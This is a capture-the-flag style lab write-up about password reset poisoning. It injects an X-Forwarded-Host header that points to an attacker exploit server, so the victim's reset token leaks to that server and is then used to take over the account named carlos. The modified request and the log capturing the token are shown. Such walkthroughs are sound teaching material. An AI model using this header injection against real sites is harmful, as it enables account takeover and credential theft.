# Lab: Password reset poisoning via middleware

>This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. 

>You can log in to your own account using the following credentials: wiener:peter. 

>Any emails sent to this account can be read via the email client on the exploit server.

### First Step
Resetting the password sends the following link to the email client:

`https://acdd1f941f1fc3a8c08946a8003100cb.web-security-academy.net/forgot-password?temp-forgot-password-token=K1FH957iVoipNlSw7IfKDPJbty4Us4fI`

If we could get the token for `carlos`, then maybe we can reset his password? Everything else in the link looks "constant" / static to me

### Vulnerable Request
After clicking on the link that I was sent, I got a request with the following:

`GET /forgot-password?temp-forgot-password-token=K1FH957iVoipNlSw7IfKDPJbty4Us4fI`

This is the page where I can reset my password, and where the token is first seen in the request

Also worth noting, the password reset link is sent right after `POST /forgot-password`... I modified these parts of the request to send a password reset request for carlos:

`X-Forwarded-Host: exploit-ac791f441fb1c339c025469f01650091.web-security-academy.net

username=carlos`

I learned that `X-Forwarded-Host` forwards the request to another place (my exploit server in this case). I can see that a request was made to my exploit server:

`172.31.31.195   2021-12-29 23:56:47 +0000 "GET /forgot-password?temp-forgot-password-token=4Aqf0ogEZrEWxik8hMa1sCLNpa9PDj2t HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"`

Looks like the header sends the result of `POST /forgot-password` to my exploit server, which is why we recieve a GET request

### Solution
Now I can plug in carlos' token into the password reset link and change his password myself. Log in with the newly set credentials and the lab is solved!

`https://acdd1f941f1fc3a8c08946a8003100cb.web-security-academy.net/forgot-password?temp-forgot-password-token=4Aqf0ogEZrEWxik8hMa1sCLNpa9PDj2t`